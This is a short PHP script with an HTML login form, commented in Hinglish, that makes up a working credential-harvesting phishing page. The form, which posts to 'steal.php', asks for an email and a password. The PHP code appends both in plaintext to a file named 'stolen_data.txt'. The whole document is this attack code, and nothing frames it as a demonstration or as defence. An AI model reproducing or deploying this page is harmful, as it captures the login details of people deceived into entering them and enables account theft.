<?php
$email = $_POST['email']; // User ke email field se data
$password = $_POST['password']; // User ke password field se data
$file = fopen("stolen_data.txt", "a"); // Data file me save
fwrite($file, "Email: $email | Password: $password\n"); // Data ko write karna
fclose($file); // File close karna
?>

<form action="steal.php" method="post">
    <input type="text" name="email" placeholder="Enter Email">
    <input type="password" name="password" placeholder="Enter Password">
    <button type="submit">Login</button>
</form>
